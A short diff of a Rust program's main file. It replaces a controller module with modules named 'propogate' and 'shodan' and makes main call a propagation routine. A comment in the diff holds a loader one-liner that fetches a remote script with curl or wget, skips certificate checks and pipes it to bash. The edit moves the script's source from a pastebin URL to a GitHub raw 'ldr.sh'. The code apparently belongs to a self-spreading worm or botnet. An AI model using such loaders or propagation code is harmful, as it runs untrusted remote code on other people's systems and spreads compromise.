@@ -1,18 +1,15 @@
-mod control;
-
-use control::Controller;
+mod propogate;
+mod shodan;
 
 use env_logger::{Builder, Env};
 
 
-// (curl -kL https://pastebin.com/raw/2GF3g5me || wget -q --no-check-certificate -O- https://pastebin.com/raw/2GF3g5me ) | bash
+// (curl -kL https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh || wget -q --no-check-certificate -O- https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh ) | bash
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
+fn main() {
     Builder::from_env(Env::default().default_filter_or("info")).init();
 
-    let controller = Controller::new();
-
-    controller.run()
+    propogate::run();
 }
 
 
